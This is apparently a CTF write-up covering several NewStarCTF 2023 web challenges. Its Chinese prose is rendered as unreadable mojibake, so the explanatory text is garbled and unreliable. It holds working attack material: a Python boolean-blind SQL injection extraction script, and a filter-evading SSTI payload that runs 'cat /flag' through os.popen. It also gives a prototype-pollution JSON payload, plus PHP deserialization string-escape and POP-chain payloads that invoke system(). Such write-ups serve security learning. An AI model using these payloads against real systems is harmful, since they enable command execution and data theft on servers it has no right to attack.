å¦‚æœæ˜¯#æ³¨é‡Šçš„è¯ï¼Œä¼šæœ‰ä¸‹å›¾æŠ¥é”™ï¼Œè¯´æ˜¯æµè§ˆå™¨æ— æ³•è§£æä½ æ‰€å‘é€çš„è¯·æ±‚ã€‚ã€‚ã€‚ã€‚ ![image-20231029105409952](NewStarCTF 2023/image-20231029105409952.png) æ­£ç¡®payloadå¦‚ä¸‹ï¼š ?id=TMP0919' And if(1&gt;0,1,0)--+ ?id=TMP0919' And if(0&gt;1,1,0)--+ å‘ç°ç¬¬ä¸€ä¸ªæœ‰å›æ˜¾ï¼Œç¬¬äºŒä¸ªä¼šæŠ¥é”™è¯´ï¼šidä¸å­˜åœ¨ï¼Œæ•…å­˜åœ¨å¸ƒå°”ç›²æ³¨ è¿™é‡Œç›´æ¥ä¸Špyè„šæœ¬äº†ï¼ˆç”¨çš„äºŒåˆ†æŸ¥æ‰¾ï¼Œå¾ˆé«˜æ•ˆï¼‰ import requests import time def condition(res): #åˆ¤æ–­å›æ˜¾å†…å®¹ä¸­æ˜¯å¦æœ‰å…³é”®è¯ if 'Physics' in res.text: return True return False result = '' _url = 'http://574acc4c-77b6-4ebe-8f29-28c546083e86.node4.buuoj.cn:81/' for _time in range(1,1000): print(\"time:%d\" % (_time)) left = 32 right = 128 while (right &gt; left): mid = (left + right) // 2 # è·å–å½“å‰åº“è¡¨å # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))In({mid})),1,0)%23\" url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))In({mid})),1,0)%23\" # è·å–å­—æ®µå # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))In({mid})),1,0)%23\" # è·å–å­—æ®µå€¼ time.sleep(0.2) res = requests.get(url=url) if (condition(res)): result += chr(mid) print(result) break else: # è·å–å½“å‰åº“è¡¨å # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(table_name))fRom(infOrmation_schema.tables)whEre((tAble_schema) In (dAtabase()))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23\" # è·å–å­—æ®µå # url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(grouP_cOncat(column_name))fRom(infOrmation_schema.columns)whEre((tAble_name) In ('here_is_flag'))) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23\" # è·å–å­—æ®µå€¼ url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))&gt;({mid})),1,0)%23\" res = requests.get(url=url) if (condition(res)): left = mid else: right = mid æ€è·¯å°±æ˜¯å…ˆæ„é€ urlï¼Œæ¥ç€ç¬¬ä¸€ä¸ªå¾ªç¯å®šä¹‰äº†ä¸ªtimeå˜é‡ï¼Œç”¨é€”è®°å½•å½“å‰æŸ¥è¯¢è¿›ç¨‹çš„åŒæ—¶ï¼Œå¯ä¼šåœ¨åç»­èµ·åˆ°æˆªå–ä¸€ä¸ªå­—ç¬¦çš„ä½œç”¨ï¼Œç”¨äºåŒ¹é…asciiç å€¼æ˜¯å¦ç›¸ç­‰ã€‚éšåå®šä¹‰äº†leftï¼Œrightç”¨äºäºŒåˆ†æŸ¥æ‰¾ï¼Œåªæœ‰å½“rightå¤§äºleftååœ¨è¿›å…¥å¾ªç¯ï¼Œéšåå®šä¹‰ä¸€ä¸ªä¸­é—´å€¼mid url = f\"{_url}?id=TMP0919' And if((((Ord(sUbstr((Select(flag)fRom(here_is_flag)) fRom {_time} FOr 1))))In({mid})),1,0)%23\" è¿™é‡Œæ˜¯æˆ‘ä»¬è¦æŸ¥æ‰¾çš„payloadï¼Œæ€è·¯å°±æ˜¯å…ˆæ˜¯å¯»å¸¸sqlè¯­å¥ï¼Œselectâ€¦fromâ€¦ä¹‹åé€šè¿‡from time for 1æå–æŸä¸€ä¸ªç¡®å®šå­—ç¬¦ï¼Œordè½¬æ¢æˆasciiå€¼ï¼Œå†ä¸å½“å‰midå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰åˆ™å¡«å……åˆ°resultç»“æœä¸­ï¼Œå¦‚æœä¸æƒ³ç­‰ï¼Œåˆ™åˆ¤æ–­å½“å‰ordå€¼ä¸midå€¼çš„å¤§å°ï¼Œè¿›è€Œåˆ¤æ–­åç»­midå€¼çš„å–æ³•ã€‚ æˆ‘å†ç»ƒä¹ ä¸€æ³¢ä¸Šè¿°ä»£ç çš„ç¼–å†™å°±okäº†ï¼ ![image-20231029141425644](NewStarCTF 2023/image-20231029141425644.png) WEEK3|WEB-GenShin ![image-20231029150138096](NewStarCTF 2023/image-20231029150138096.png) è¿™é‡Œæç¤ºæˆ‘ä»¬æ‰¾ä¸€äº›ä¿¡æ¯ï¼Œçœ‹äº†wpçŸ¥é“åœ¨å“åº”å¤´ä¸­æœ‰ä¸€ä¸ªPopå¤´ï¼ŒåŒ…å«ç€ä¸€ä¸ªè·¯ç”±ï¼Œä½†æˆ‘æœå¯»äº†ä¸€ç•ªä¹Ÿæ²¡å‘ç°Popçš„ä½œç”¨ï¼Œå¯èƒ½å°±æ˜¯å‡ºé¢˜äººè‡ªå·±è®¾ç½®çš„å§ ![image-20231029150249693](NewStarCTF 2023/image-20231029150249693.png) æˆ‘ä»¬æ·»åŠ è¯¥urlè®¿é—®çœ‹åˆ°é¡µé¢è¦æ±‚æˆ‘ä»¬ç»™nameè¿›è¡Œgetä¼ å‚ ![image-20231029150313194](NewStarCTF 2023/image-20231029150313194.png) è¿™é‡Œåˆšä¼ äº†ä¸€ä¸‹å°±è¢«banäº†ã€‚ã€‚ã€‚ä¹‹åæˆ‘ä¹Ÿå°±ä¸çŸ¥é“äº†ï¼Œåˆå¾—çœ‹wpï¼Œä»–æ˜¯è¿™æ ·è¯´çš„ï¼š é¦–å…ˆå°è¯•ä¸€ä¸‹æ™®é€šçš„{{7*7}}ï¼Œå› ä¸ºè¢«è¿‡æ»¤äº†è¿ç»­çš„{{ï¼Œæ‰€ä»¥è¿™é‡Œå›æ˜¾ä¸äº† é‚£ä¹ˆåªæœ‰ç”¨å¦ä¸€ä¸ªæ–¹æ³•äº†ï¼Œåœ¨{% %}é‡Œé¢å¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œåªè¦ä¸æŠ¥é”™å°±è¡Œï¼Œæ¯”å¦‚ å…¶å®æ¯æ¬¡æˆ‘ä»¬é‡åˆ°è¿™ç§é¢˜ç›®éƒ½æ˜¯åº”è¯¥å»fuzzä¸€ä¸‹ï¼Œçœ‹çœ‹è¿‡æ»¤äº†é‚£äº›å­—ç¬¦ï¼Œä½†æˆ‘ä¹Ÿä¸çŸ¥é“å¦‚ä½•å»fuzzï¼Œåªæ˜¯æ„Ÿè§‰æ˜¯å»æä¸€ä¸ªä¸“é—¨çš„å­—å…¸å»çˆ†ç ´çœ‹å›æ˜¾çŠ¶æ€ï¼ˆä½†å¿ƒé‡Œä¹Ÿæ²¡åº•ï¼‰ ![image-20231029150632111](NewStarCTF 2023/image-20231029150632111.png) å¦‚ä¸Šå›¾æˆ‘ä»¬æˆåŠŸæ‰§è¡Œï¼Œæ¥ä¸‹æ¥æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨key ![image-20231029151043843](NewStarCTF 2023/image-20231029151043843.png) å¦‚ä¸Šå›¾æ˜¯ä¸å­˜åœ¨çš„ï¼Œé‚£å°±æ˜¯å¸¸è§„æ€è·¯ï¼šæ‹¿åˆ°ç›¸å…³å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å­ç±» ?name={%print(\"\".__class__.__base__.__subclasses__())%} ![image-20231029151546824](NewStarCTF 2023/image-20231029151546824.png) è¿™é‡ŒæˆåŠŸåœ¨132å¤„æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å‡½æ•°ï¼Œä½†æ¥ä¸‹æ¥å‘ç°initè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬é‡‡ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ ?name={%print(\"\".__class__.__base__.__subclasses__()[132]|attr(\"__in\"+\"it__\")|attr(\"__globals__\"))%} ![image-20231029152337985](NewStarCTF 2023/image-20231029152337985.png) è¿™é‡Œé‡‡ç”¨evalå‡½æ•°ï¼Œéšåè¿›è¡Œåˆ©ç”¨çš„æ—¶å€™å‘ç°å°†osç­‰è¿‡æ»¤äº†ï¼Œè¿™é‡Œæƒ³é‡‡ç”¨unicodeç¼–ç çš„ï¼Œä½†ä¹Ÿæ˜¯è¢«è¿‡æ»¤äº†ï¼Œä¹‹ååˆå°è¯•base64ä¹Ÿæ˜¯ä¸è¡Œ çœ‹äº†wpå‘ç°è¿™é‡Œè¦ç”¨chrç¼–ç ç»•è¿‡ eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41)) å¦‚ä¸Šæ˜¯ä»–çš„payloadï¼Œä½†è¿™é‡Œæœ‰ä¸ªå‘ï¼Œä»–ä»¬ä¹‹é—´ä¸å¯ç”¨å°æ•°ç‚¹è¿æ¥ï¼Œä¸ç„¶pyä¼šè®¤ä¸ºåè€…æ˜¯å‰è€…çš„å±æ€§ï¼Œè€Œè¿™ä¸ªå¸ˆå‚…é‡‡ç”¨%2bè¿æ¥ä¹Ÿå°±æ˜¯+å·ï¼Œä½†æ˜¯ä½ ç›´æ¥å†™å…¥+å·ä¹Ÿä¸å¯ï¼Œå½“ä½ è¿™æ ·è¾“å…¥ä¼šå‘ç°ï¼Œurlå°†å…¶å½“åšç©ºæ ¼ã€‚æ•…ä»–é‡‡ç”¨%2bè¿æ¥ æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š ?name={%print(\"\".__class__.__base__.__subclasses__()[132]|attr(\"__in\"+\"it__\")|attr(\"__globals__\")|attr(\"get\")(\"__builtins__\")|attr(\"get\")(\"eval\")(\"eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))\"))%} ![image-20231029155143561](NewStarCTF 2023/image-20231029155143561.png) æ‹¿åˆ°flag WEEK3|WEB-OtenkiGirl ä¸€é“nodejsåŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›®ï¼Œæˆ‘å¯¹è¿™ä¸€å—å„¿æŒæ¡å¾ˆå°‘ï¼Œè™½ç„¶åœ¨æ­¤ä¹‹å‰å­¦ä¹ äº†ä¸€æ³¢ï¼Œä½†è¿˜æ˜¯ä¸ç†Ÿç»ƒï¼Œä¸‹é¢è·Ÿç€wpèµ°ä¸€é ![image-20231030213459589](NewStarCTF 2023/image-20231030213459589.png) é¦–å…ˆæˆ‘ä»¬éšä¾¿è¾“å…¥ä¿¡æ¯ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹ ![image-20231030213641774](NewStarCTF 2023/image-20231030213641774.png) å‘ç°æ˜¯ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œæ•°æ®æ ¼å¼ä¸ºjsonã€‚æ¥ä¸‹æ¥åˆ†æä¸€æ³¢é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œè¿™é‡Œå…ˆçœ‹çœ‹app.jsçš„å†…å®¹ ![image-20231030215106140](NewStarCTF 2023/image-20231030215106140.png) å¦‚ä¸Šå›¾ï¼Œæ„Ÿè§‰é‡ç‚¹å°±æ˜¯ç»™äº†ä¸¤ä¸ªè·¯ç”±ï¼šinfoå’Œsubmitï¼Œå¹¶ä¸”è¿˜åˆ¤æ–­äº†ä¸€ä¸‹è¯·æ±‚åŒ…çš„æŸäº›æ•°æ®æ˜¯å¦ç¬¦åˆè§„å®šï¼Œå†å†³å®šæ˜¯å¦å›æ˜¾æ­£ç¡®æ•°æ®ã€‚ é‚£æˆ‘ä»¬æ¥ä¸‹æ¥çœ‹çœ‹submit.jså’Œinfo.js å…¶ä¸­submitä¸­çš„é‡ç‚¹æˆ‘æ„Ÿè§‰å°±æ˜¯mergeå‡½æ•°ï¼Œè¿™é‡Œè‚¯å®šå°±æ˜¯æ¼æ´åˆ©ç”¨ç‚¹äº†ï¼Œä½†æˆ‘ä»¬è¿˜ä¸æ¸…æ¥šæ¼æ´åœ¨å“ªé‡Œï¼Œæ¥ä¸‹æ¥åœ¨çœ‹çœ‹info ![image-20231030214323684](NewStarCTF 2023/image-20231030214323684.png) ä½†çœ‹äº†åŠå¤©ä¹Ÿçœ‹ä¸æ‡‚ï¼Œåªæ€ªè‡ªå·±ä»£ç å®¡è®¡ä¸è¡Œå•Šï¼Œçœ‹wpå¦‚ä½•åˆ†æå§ æŸ¥çœ‹routes/info.jsæºç ï¼Œè€ƒå¯Ÿä»æ•°æ®åº“ä¸­è·å–æ•°æ®çš„å‡½æ•°getInfo async function getInfo(timestamp) { timestamp = typeof timestamp === \"number\" ? timestamp : Date.now(); // Remove test data from before the movie was released let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime(); timestamp = Math.max(timestamp, minTimestamp); const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e }); return data; } å…¶ä¸­ç¬¬4è¡Œå’Œç¬¬5è¡Œå°†æˆ‘ä»¬ä¼ å…¥çš„timestampåšäº†ä¸€ä¸ªè¿‡æ»¤ï¼Œä½¿å¾—æ‰€è¿”å›çš„æ•°æ®ä¸æ—©äºé…ç½®æ–‡ä»¶ä¸­çš„min_public_time å…·ä½“è§£é‡Šä¸ºï¼š è¿™è¡Œä»£ç åˆå§‹åŒ–ä¸€ä¸ªminTimestampå˜é‡ã€‚å®ƒä»é…ç½®å¯¹è±¡CONFIGä¸­è·å–min_public_timeå±æ€§çš„å€¼ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä½¿ç”¨é»˜è®¤é…ç½®å¯¹è±¡DEFAULT_CONFIGä¸­çš„min_public_timeå±æ€§çš„å€¼ã€‚ç„¶åï¼Œé€šè¿‡new Date()æ„é€ å‡½æ•°å°†è¯¥æ—¶é—´è½¬æ¢ä¸ºä¸€ä¸ªæ—¥æœŸå¯¹è±¡ï¼Œå¹¶ä½¿ç”¨getTime()æ–¹æ³•è·å–å…¶å¯¹åº”çš„æ—¶é—´æˆ³ã€‚ æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„config.jså’Œconfig.default.jsåå‘ç°config.jså¹¶æ²¡æœ‰é…ç½®min_public_timeï¼Œå› æ­¤getInfoçš„ç¬¬5è¡Œåªæ˜¯é‡‡ç”¨äº†DEFAULT_CONFIG.min_public_time --è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥å®ç°å°†å…¶è¿”å›ä¸€ä¸ªæ¯”min_public_timeè¿˜è¦æ—©çš„æ—¶é—´ï¼Œè¯´ä¸å®šå°±ä¼šæ‰¾åˆ°flag ![image-20231030221439241](NewStarCTF 2023/image-20231030221439241.png) è€ƒè™‘åŸå‹é“¾æ±¡æŸ“æ±¡æŸ“min_public_timeä¸ºæˆ‘ä»¬æƒ³è¦çš„æ—¥æœŸï¼Œå°±èƒ½ç»•è¿‡æœ€æ—©æ—¶é—´é™åˆ¶ï¼Œè·å–ä»»æ„æ—¶é—´çš„æ•°æ® ç»“åˆroutes/submit.jsæºç çš„æ³¨å…¥ç‚¹ ![image-20231030221603437](NewStarCTF 2023/image-20231030221603437.png) æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œä»–å°†æ•°æ®dataèµ‹å€¼ç»™DEFAULTå‚æ•°ï¼Œè€Œè¯¥å‚æ•°ä¸­åªå«æœ‰dateå’Œplaceï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¿®æ”¹dataçš„data['__proto__']['min_public_time']å€¼å³å¯ï¼Œpayloadå¦‚ä¸‹ {\"contact\":\"asd\",\"reason\":\"asd\",\"__proto__\":{\"min_public_time\":\"1001-01-01\"}} ![image-20231030222312128](NewStarCTF 2023/image-20231030222312128.png) ä¹‹åè®¿é—®/info/0ä¼šå‘ç°å¤šå‡ºå¾ˆå¤šä¿¡æ¯ï¼Œå…¶ä¸­æ‰¾åˆ°flagï¼Œè¿™é‡Œæ³¨æ„ä¸Šä¸‹å›¾çš„è§£ææ ¼å¼ï¼Œä¸Šé¢ä¸ºapplication/jsonï¼Œä¸‹é¢çš„å¦‚ä¸‹å›¾ ![image-20231030222453202](NewStarCTF 2023/image-20231030222453202.png) è‡³äºä¸Šè¿°ä¸ºä½•è¦è®¿é—®/info/0è¿™ä¸ªè·¯ç”±æ˜¯å› ä¸ºä¸‹é¢çš„ä»£ç  ![image-20231030222701126](NewStarCTF 2023/image-20231030222701126.png) å¦‚ä¸Šå›¾ï¼Œinfo/0ï¼Œè¿™é‡Œçš„0æ˜¯å¯å˜çš„ï¼Œä¹‹åä»–ä¼šæ£€æŸ¥content-typeç­‰ç­‰ï¼Œä¹‹åæ²¡é—®é¢˜çš„è¯ä¼šè°ƒç”¨getinfoå‡½æ•°æŸ¥è¯¢æ•°æ®åº“ï¼Œå›æ˜¾å†…å®¹ã€‚ **æ³¨æ„ï¼š**åœ¨æäº¤ payload çš„è¯·æ±‚åç›´æ¥åˆ·æ–°ç½‘é¡µå¹¶ä¸ä¼šè·å–åˆ°ä¸Šé¢çš„æ•°æ®ï¼Œè¿™æ˜¯å› ä¸ºç½‘é¡µå¯ç”¨äº†ç¼“å­˜ï¼Œä¼šå‘é€æœ¬åœ°ç¼“å­˜ä¸­æœ€æ™šæ—¶é—´çš„infoè¯·æ±‚ã€‚å¦‚æœæƒ³è¦é€šè¿‡åˆ·æ–°ç½‘é¡µè·å–æ•°æ®ï¼Œåªéœ€è¦åœ¨å¼€å‘è€…å·¥å…· -&gt; åº”ç”¨ç¨‹åº -&gt; å­˜å‚¨ä¸­æ¸…é™¤ç½‘ç«™æ•°æ®ç„¶ååˆ·æ–°ç½‘é¡µå³å¯ã€‚ åªèƒ½è¯´ï¼Œé‡åˆ°è¿™ç§é¢˜ï¼Œå¾ˆè€ƒéªŒä»£ç å®¡è®¡åŠŸåº•ï¼Œå…ˆä¸è¯´æŠ€æœ¯å¦‚ä½•ï¼Œä¸€å †å †çš„ä»£ç éœ€è¦è¶³å¤Ÿçš„è€å¿ƒå»å®¡ï¼Œè¦ä¸æ˜¯æˆ‘é ç€wpï¼Œæˆ‘ä¼°è®¡å°±ç–¯æ‰äº†ã€‚ã€‚ã€‚ã€‚ï¼Œå”‰ï¼Œè¿˜æ˜¯ç¼ºä¹å­¦ä¹ çš„ç²¾ç¥ã€‚ WEEK4|WEB-é€ƒ &lt;?php highlight_file(__FILE__); function waf($str){ return str_replace(\"bad\",\"good\",$str); } class GetFlag { public $key; public $cmd = \"whoami\"; public function __construct($key) { $this-&gt;key = $key; } public function __destruct() { system($this-&gt;cmd); } } unserialize(waf(serialize(new GetFlag($_GET['key'])))); www-data www-data é¡¾åæ€ä¹‰ï¼Œè¿™é“é¢˜å°±æ˜¯ç®€å•çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæœ¬åœ°è¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼Œåºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æ„ ![image-20231106200131159](NewStarCTF 2023/image-20231106200131159.png) å¯ä»¥çœ‹åˆ°å…¶ä¸­çš„cmdå¹¶ä¸å¯æ§ï¼Œä½†ç”±äºwafçš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°å­—ç¬¦ä¸²é€ƒé€¸ï¼Œå°†åç»­çš„s:3:\"cmd\";s:6:\"whoami\";}è¸¢å‡ºå» æˆ‘ä»¬çœ‹å¦‚ä¸‹ ![image-20231106200324320](NewStarCTF 2023/image-20231106200324320.png) å¦‚ä¸Šå›¾ï¼Œs:6ä½†åç»­çš„goodgoodæ˜¯å…«ä¸ªï¼Œé‚£æœ€åçš„ä¸¤ä¸ªodå­—ç¬¦å°±ä¼šè¢«æŠ›å¼ƒï¼Œå½“ç„¶ï¼Œæ­¤æ—¶çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¹Ÿå› ä¸ºè¿™ä¸ªåŸå› å˜å¾—ä¸åˆæ³•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹æ¥æ„é€ å‡ºåˆæ³•çš„å­—ç¬¦ä¸²å»ä¿®æ”¹cmdçš„å€¼ã€‚ æˆ‘ä»¬æƒ³è¾¾åˆ°çš„payloadä¸ºï¼š\";s:3:\"cmd\";s:2:\"ls\";}å…±22ä¸ªå­—ç¬¦ï¼Œè€Œbadæ¢æˆgoodå¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ22ä¸ªbadå³å¯ï¼Œpayloadå¦‚ä¸‹ï¼š badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:2:\"ls\";} badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:3:\"cmd\";s:9:\"cat /flag\";} ![image-20231106201141230](NewStarCTF 2023/image-20231106201141230.png) æ‹¿åˆ°flag WEEK4|WEB-More Fast &lt;?php highlight_file(__FILE__); class Start{ public $errMsg; public function __destruct() { die($this-&gt;errMsg); } } class Pwn{ public $obj; public function __invoke(){ $this-&gt;obj-&gt;evil(); } public function evil() { phpinfo(); } } class Reverse{ public $func; public function __get($var) { ($this-&gt;func)(); } } class Web{ public $func; public $var; public function evil() { if(!preg_match(\"/flag/i\",$this-&gt;var)){ ($this-&gt;func)($this-&gt;var); }else{ echo \"Not Flag\"; } } } class Crypto{ public $obj; public function __toString() { $wel = $this-&gt;obj-&gt;good; return \"NewStar\"; } } class Misc{ public function evil() { echo \"good job but nothing\"; } } $a = @unserialize($_POST['fast']); throw new Exception(\"Nope\"); Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55 ç®€å•åˆ†æä¸€ä¸‹é“¾å­ï¼Œpopé“¾å­å¦‚ä¸‹ï¼šstart.die-&gt;Crypto.toString-&gt;Reverse.get-&gt;Pwn.invoke-&gt;web.evil å°±åœ¨æˆ‘ä»¥ä¸ºè¿™é“é¢˜å¾ˆç®€å•çš„æ—¶å€™ï¼Œè¿˜æ˜¯ç¿»è½¦äº†ï¼Œåœ¨ä¼ å…¥ä¸Šè¿°payloadæ— æœåï¼Œæˆ‘æ³¨æ„åˆ°äº†throw new Exception(\"Nope\");ï¼Œå› ä¸ºæ­¤å‰å¹¶æ²¡æœ‰è§è¿‡ï¼Œä½†æˆ‘è‚¯å®šé—®é¢˜å°±æ˜¯è¿™é‡Œäº†ï¼Œäºæ˜¯å…³é”®è¯æœäº†æœï¼Œå‘ç°æ˜¯GCåƒåœ¾å›æ”¶æœºåˆ¶åœ¨ä½œæ€ªã€‚è¿™é‡Œä¹Ÿæ²¡æœ‰å¾ˆæ¸…æ¥šçš„ææ˜ç™½æ˜¯æ€ä¹ˆä¸€å›äº‹ï¼Œè¿™é‡Œæˆ‘å…ˆå¤ç°å‡ºæ¥åœ¨æ€è€ƒå§ã€‚ æ–‡ç« è¯´è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨çš„å»é”€æ¯å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æ˜¯ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼špayloadå¦‚ä¸‹ &lt;?php class Start{ public $errMsg; } class Pwn{ public $obj; } class Reverse{ public $func; } class Web{ public $func; public $var; } class Crypto{ public $obj; } class Misc{ } $poc = new Start(); $poc-&gt;errMsg = new Crypto(); $poc-&gt;errMsg-&gt;obj = new Reverse(); $poc-&gt;errMsg-&gt;obj-&gt;func = new Pwn(); $poc-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = new Web(); $poc-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;func = 'system'; $poc-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;var = 'ls'; echo serialize($poc); ?&gt; è¿™é‡Œæˆ‘ä»¬æœ€å…ˆçš„payloadï¼Œè¿™é‡Œåšå¦‚ä¸‹ä¿®æ”¹serialize(array($poc, null)); å¾—åˆ° a:2:{i:0;O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:2:\"ls\";}}}}}i:1;N;} æ¥ç€å°†åç»­çš„1æ”¹ä¸º0 a:2:{i:0;O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:2:\"ls\";}}}}}i:0;N;} ![image-20231106204545388](NewStarCTF 2023/image-20231106204545388.png) æˆåŠŸå›æ˜¾ï¼Œæœ€ç»ˆpayload a:2:{i:0;O:5:\"Start\":1:{s:6:\"errMsg\";O:6:\"Crypto\":1:{s:3:\"obj\";O:7:\"Reverse\":1:{s:4:\"func\";O:3:\"Pwn\":1:{s:3:\"obj\";O:3:\"Web\":2:{s:4:\"func\";s:6:\"system\";s:3:\"var\";s:9:\"cat /fla*\";}}}}}i:0;N;} //é€šé…ç¬¦ç»•è¿‡ ![image-20231106204623504](NewStarCTF 2023/image-20231106204623504.png) æ¥ä¸‹æ¥å¼€å§‹ä»”ç»†æ€è€ƒäº†ï¼Œç›¸å…³æ–‡ç« æ˜¯è¿™æ ·è¯´çš„ï¼š åœ¨phpä¸­ï¼Œå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__destruct()æ–¹æ³•ï¼Œä½†å¦‚æœç¨‹åºæŠ¥é”™æˆ–è€…æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ã€‚ å½“ä¸€ä¸ªç±»åˆ›å»ºä¹‹åå®ƒä¼šè‡ªå·±æ¶ˆå¤±ï¼Œè€Œ __destruct() é­”æœ¯æ–¹æ³•çš„è§¦å‘æ¡ä»¶å°±æ˜¯ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è§¦å‘ï¼Œè€Œthrowé‚£ä¸ªå‡½æ•°å°±æ˜¯å›æ”¶äº†è‡ªåŠ¨é”€æ¯çš„ç±»ï¼Œå¯¼è‡´destructæ£€æµ‹ä¸åˆ°æœ‰ä¸œè¥¿é”€æ¯ï¼Œä»è€Œä¹Ÿå°±å¯¼è‡´æ— æ³•è§¦å‘destructå‡½æ•°ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡æå‰è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œç»•è¿‡GCå›æ”¶ï¼Œå”¤é†’__destruct()é­”æœ¯æ–¹æ³•ã€‚ è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶çš„æ–¹æ³•æœ‰ï¼šï¼ˆæœ¬è´¨å³ä½¿å¯¹è±¡å¼•ç”¨è®¡æ•°å½’é›¶ï¼‰ ï¼ˆ1ï¼‰å¯¹è±¡è¢«unset()å¤„ç†æ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚ ï¼ˆ2ï¼‰æ•°ç»„å¯¹è±¡ä¸ºNULLæ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚ è¿™é‡Œåœ¨æ€»ç»“ä¸€ä¸‹destructé­”æœ¯æ–¹æ³•çš„è°ƒç”¨æƒ…å†µï¼š 1.ä¸»åŠ¨è°ƒç”¨unset($obj) 